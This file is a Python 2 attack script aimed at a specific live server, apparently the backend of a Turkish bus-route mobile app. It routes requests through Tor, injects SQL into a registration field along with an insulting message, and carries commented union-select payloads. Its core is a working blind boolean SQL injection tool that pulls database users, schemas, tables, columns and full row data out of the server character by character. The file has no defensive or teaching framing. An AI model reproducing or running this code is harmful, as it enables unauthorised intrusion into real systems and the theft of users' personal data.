# -*- coding: utf-8 -*-
import requests, requesocks
import sys
import getopt

fail = "{'data':[]}"

headers = {'User-agent': 'otobushatlari 2.0.5 HTC Vision 2.3.3'}
payload = {'UID': "-1' or AdSoyad='amk gotgillergeldimi", 'TIP':'Durak'}
proxy = {"http":"socks5://localhost:9050","https":"socks5://localhost:9050"}

url = 'http://212.175.165.42/mobil/android/tools.asp?SID=0.6759915620561532&VERSION=2.0.5&FNC=Connect'
r = requesocks.post(url, data=payload, headers=headers, proxies=proxy)
print r.text



#-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,table_name from information_schema.tables where table_schema='%s' LIMIT %d,1 union select * from map_kullanici where '0'='1

#-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,column_name from information_schema.columns where table_name='%s' LIMIT %d,1 union select * from map_kullanici where '0'='1

#-1' union select 1,2,3,4,5,6,7,8,9,10,11,12,%s from %s LIMIT %d,1 union select * from map_kullanici where '0'='1

url = 'http://212.175.165.42/mobil/android/kullanici.asp?SID=0.6757915620561532&VERSION=2.0.5&FNC=KullaniciKaydet'
payload = {'UID': "ffffffff-d327-7b72-cb6b-dceb3612c85e", 'ADSOYAD':'', 'TELEFON':'', 'EPOSTA':'', 'HARITATIPI':'', 'YAKLASIM':'', 'OTOBUSKONUMGUNCELLEME': '', 'OTOBUSOTOMATIKTAKIP':"', Mesaj='abi kusra bakma da cok malsin yhaa keske olsen .s.s :(((", 'HATDURAKGORUNUMU':'', 'YAKINLIK':""}

r = requests.post(url, data=payload, headers=headers)
print r.text

sys.exit(0)

url = 'http://212.175.165.42/mobil/android/favori.asp?SID=0.6757915620561532&VERSION=2.0.5&FNC=FavoriAra'
UID = '00000000-4b50-00b6-ffff-ffff877b9194'

def matchInt(query):
	res = 0
	
	query = query.replace('=%d', '<%d', 1)
	inc = 100000
	l=0
	while True:
		payload['UID'] = UID + (query % l)
		r = requests.post(url, data=payload, headers=headers)
		#print l, inc
		#print payload['UID']
		if r.text != fail:
			if inc == 10:
				query = query.replace('<%d', '=%d', 1)
			if inc>=10:
				l-=inc
				inc /= 10
				l-=inc
			elif inc == 1:
				res = l
				break
		l+=inc
	
	return res
	
def matchChr(query):
	l=32
	u=127
	mid=0
	while l<=u:
		mid = (l+u)/2
		payload['UID'] = UID + (query % mid)
		r = requests.post(url, data=payload, headers=headers)
		if r.text != fail:
			u = mid-1
		else:
			l = mid+1
			payload['UID'] = UID + (query.replace('<', '=', 1) % mid)
			r = requests.post(url, data=payload, headers=headers)
			if r.text != fail:
				break
	return chr(mid)
	
def getUsers():
	usercounter = "' and (select count(*) from (select GRANTEE from information_schema.USER_PRIVILEGES group by GRANTEE) as a)=%d and '1'='1"
	userlengthc = "' and length((select GRANTEE from information_schema.USER_PRIVILEGES group by GRANTEE limit %d,1))=%d and '1'='1"
	userchecker = "' and ord(mid((select GRANTEE from information_schema.USER_PRIVILEGES group by GRANTEE limit %d,1),%d,1))<%d and '1'='1"
	
	usercount = matchInt(usercounter)
	if verboseLevel>=2:
		print "UserCount:", usercount
	
	users = []
	for usr in range(usercount):
		username = ""
		userlen = matchInt(userlengthc.replace('%d', str(usr), 1))
		for l in range(1, userlen+1):
			username += matchChr(userchecker.replace('%d', str(usr), 1).replace('%d', str(l), 1))
		users.append(username)
		if verboseLevel>=3:
			print "User found", username
	
	return users

def getDBs():
	dbcounter = "' and (select count(*) from (select count(*) from information_schema.tables group by table_schema) as a)=%d and '1'='1"
	dblengthc = "' and length((select table_schema as x from information_schema.tables group by x limit %d,1))=%d and '1'='1"
	dbchecker = "' and ord(mid((select table_schema as x from information_schema.tables group by x limit %d,1),%d,1))<%d and '1'='1"

	dblength=0
	dbname=""
	databases = []

	dbcount = matchInt(dbcounter)
	if verboseLevel>=2:
		print "DBCount:", dbcount

	for db in range(dbcount):
		dbname = ""
		dblength = matchInt(dblengthc.replace('%d', str(db), 1))
		for l in range(1, dblength+1):
			dbname += matchChr(dbchecker.replace('%d', str(db), 1).replace('%d', str(l), 1))
		databases.append(dbname)
		if verboseLevel>=3:
			print "DB found", dbname
	
	return databases

def getTables(db):
	tbcounter = "' and (select count(*) from information_schema.tables where table_schema='"+db+"')=%d and '1'='1"
	tblengthc = "' and (select length(table_name) from information_schema.tables where table_schema='"+db+"' limit %d,1)=%d and '1'='1"
	tbchecker = "' and ord(mid((select table_name from information_schema.tables where table_schema='"+db+"' limit %d,1),%d,1))<%d and '1'='1"
	tables = []

	tbcount = matchInt(tbcounter)
	if verboseLevel>=2:
		print "tableCount:", tbcount
	
	for tb in range(tbcount):
		tbname = ""
		tblength = matchInt(tblengthc.replace('%d', str(tb), 1))
		for l in range(1, tblength+1):
			tbname += matchChr(tbchecker.replace('%d', str(tb), 1).replace('%d', str(l), 1))
		tables.append(tbname)
		
		if verboseLevel>=3:
			print "Table found", tbname
	
	return tables

def getColumns(db, tb):
	clcounter = "' and (select count(column_name) from information_schema.columns where table_name='"+tb+"' and table_schema='"+db+"')=%d and '1'='1"
	cllengthc = "' and (select length(column_name) from information_schema.columns where table_name='"+tb+"' and table_schema='"+db+"' limit %d, 1)=%d and '1'='1"
	clchecker = "' and ord(mid((select column_name from information_schema.columns where table_name='"+tb+"' and table_schema='"+db+"' limit %d, 1), %d, 1))<%d and '1'='1"
	
	clcount = matchInt(clcounter)
	if verboseLevel>=2:
		print "columnCount[%s]:" % tb, clcount
	
	columns = []
	for cl in range(clcount):
		clname = ""
		cllength = matchInt(cllengthc.replace('%d', str(cl), 1))
		for l in range(1, cllength+1):
			clname += matchChr(clchecker.replace('%d', str(cl), 1).replace('%d', str(l), 1))
		columns.append(clname)
		
		if verboseLevel>=3:
			print "Column found", clname
	
	return columns
	
def getRows(db, tb):
	columnnames = getColumns(db, tb)
	#columnnames = ["UId"]
	
	rowcounter = "' and (select count(*) from "+db+"."+tb+")=%d and '1'='1"
	rowlengthc = "' and (select length(%s) from "+db+"."+tb+" limit %d, 1)=%d and '1'='1"
	rowchecker = "' and ord(mid((select %s from "+db+"."+tb+" limit %d, 1), %d, 1))<%d and '1'='1"
	
	rowcount = matchInt(rowcounter)
	if verboseLevel>=2:
		print "rowCount[%s]:" % tb, rowcount
	
	rows = []
	rows.append(columnnames)
	
	for row in range(rowcount):
		rowdata = []
		for col in columnnames:
			rowcol = ""
			rowleng = matchInt(rowlengthc.replace('%s', col, 1).replace('%d', str(row), 1))
			print rowleng
			for l in range(1, rowleng+1):
				rowcol += matchChr(rowchecker.replace('%s', col, 1).replace('%d', str(row), 1).replace('%d', str(l), 1))
				print rowcol
			
			rowdata.append(rowcol)
			if verboseLevel>=4:
				print "ROW[%d]:COL[%s] =" % (row, col), rowcol
		
		rows.append(rowdata)
		
		if verboseLevel>=3:
			print "Row Data:", rowdata
	
	return rows


def main(argv):
	try:
		opts, args = getopt.getopt(argv,"hud:t:v:",["database=","table=", "verbose=", "user", "tables="])
	except getopt.GetoptError:
		print '%s [-d <dbname>] [-t <tbname>] [-v <verboseLevel>]' % argv[0]
		sys.exit(1)
	
	database = ""
	table = ""
	tables = ""
	for opt, arg in opts:
		print opt, arg
		if opt=='-h':
			print '%s [-db <dbname>] [-tb <tbname>] [-v <verboseLevel>]' % argv[0]
			sys.exit(1)
		elif opt in ('-d', '--database'):
			database = arg
		elif opt in ('-t', '--table'):
			table = arg
		elif opt in ('-v', '--verbose'):
			verboseLevel = int(arg)
		elif opt in('--tables'):
			tables = arg
		elif opt in('-u', '--user'):
			users = getUsers()
			print "Users found: " + ', '.join(users)
			sys.exit(0)
			
	if database=="":
		databases=getDBs()
		print "Databases found: " + ', '.join(databases)
		sys.exit(0)
	elif tables!="":
		tables = tables.split(", ")
		for table in tables:
			print table
			rows = getRows(database, table)
			for row in rows:
				print ' | '.join(row)
		sys.exit(0)
	elif table=="":
		tables=getTables(database)
		print "Tables found in [%s]: %s" % (database, ', '.join(tables))
		sys.exit(0)
	elif table!="":
		rows = getRows(database, table)
		for row in rows:
			print ' | '.join(row)
		sys.exit(0)
	else:
		print '%s [-db <dbname>] [-tb <tbname>] [-v <verboseLevel>]' % argv[0]
		sys.exit(1)
		
			
requests.adapters.DEFAULT_RETRIES = 100000
verboseLevel=4

if __name__ == "__main__":
	main(sys.argv[1:])

